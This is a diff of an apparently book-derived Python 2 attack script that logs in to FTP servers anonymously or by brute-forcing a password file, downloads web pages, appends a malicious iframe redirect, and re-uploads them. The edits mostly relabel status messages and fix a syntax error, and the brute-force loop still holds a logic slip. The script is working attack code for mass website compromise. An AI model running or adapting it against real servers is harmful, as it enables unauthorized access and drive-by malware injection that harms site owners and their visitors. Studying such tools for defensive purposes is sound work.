@@ -10,29 +10,29 @@ def anonLogin(hostname):
 	try:
 		ftp = ftplib.FTP(hostname)
 		ftp.login('anonymous', 'me@yourdomain.com')
-		print '\n\t[*] ' + str(hostname) + ' FTP Anonymous Login Succeeded'
+		print '\n\t[Success] ' + str(hostname) + ' FTP Anonymous Login Succeeded'
 		ftp.quit()
 		return True
 	except Exception, e:
-		print '\n\t[-] ' + str(hostname) + ' FTP Anonymous Login Failed'
+		print '\n\t[Failure] ' + str(hostname) + ' FTP Anonymous Login Failed'
 		return False
 	
 def bruteLogin(hostname, passwdFile):
-	pF = open(passwdFile, 'r'))
+	pF = open(passwdFile, 'r')
 	for line in pF.readlines():
 		time.sleep(1)
 		userName = line.split(':')[0]
 		passWord = line.split(':')[1].strip('\r').strip('\n')
-		print '[+] Trying : ' + userName +'/' + passWord
+		print ' [+] Trying : ' + userName +'/' + passWord
 	try:
 		ftp = ftplib.FTP(hostname)
 		ftp.login(userName, passWord)
-		print '\n[*] ' + str(hostname) + ' FTP Login Succeeded: ' + userName + '/' + passWord
+		print '\n[Success] ' + str(hostname) + ' FTP Login Succeeded: ' + userName + '/' + passWord
 		ftp.quit()
 		return (userName, passWord)
 	except Exception, e:
 		pass
-	print '\n[-] Could Not Brute Force FTP Credentials'
+	print '\n[Failure] Could Not Brute Force FTP Credentials'
 	return (None, None)
 
 def returnDefault(ftp):
@@ -40,26 +40,26 @@ def returnDefault(ftp):
 		dirList = ftp.nlst()
 	except:
 		dirList = []
-		print '[-] Could Not List Directory Contents'
-		print '[-] Skipping To Next Target'
+		print '[Failure] Could Not List Directory Contents'
+		print '[Continue] Skipping To Next Target'
 		return
 	retList = []
 	for fileName in dirList:
 		fn = fileName.lower()
-		if '.php' in fn or '.htm' in fn or '.asp' in fn:
-			print '[+] Found Default Page: ' + fileName
+		if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn:
+			print '[+] Found Home Page: ' + fileName
 		retList.append(fileName)
 	return retList
 
 def injectPage(ftp, page, redirect):
 	f = open(page + '.tmp', 'w')
 	ftp.retrlines('RETR ' + page, f.write)
-	print '[+] Downloaded Page: ' + page
+	print ' [Step 1] Downloaded Page: ' + page
 	f.write(redirect)
 	f.close()
-	print '[+] Injected Malicious IFrame on: '+ page
+	print ' [Step 2] Injected Malicious IFrame on: '+ page
 	ftp.storlines('STOR ' + page, open(page + '.tmp'))
-	print '[+] Uploaded Injected Page: ' + page
+	print ' [Step 3] Uploaded Injected Page: ' + page
 	
 def attack(username, password, tgtHost, redirect):
 	ftp = ftplib.FTP(tgtHost)
@@ -86,12 +86,12 @@ def main():
 		if anonLogin(tgtHost) == True:
 			username = 'anonymous'
 			password = 'me@yourdomain.com'
-			print '[+] Using Anonymous Credientals To Attack'
+			print ' [Success] Now Using Anonymous Username and Password'
 			attack(username, password, tgtHost, redirect)
 		elif passwdFile != None:
 			(username, password) = bruteLogin(tgtHost, passwdFile)
 		if password != None:	
-			print '[+] Usind Credientals: ' + username + '/' + password + ' To Attack'
+			print '[+] Using Credientals: ' + username + '/' + password + ' To Attack'
 			attack(username, password, tgtHost, redirect)
 
 
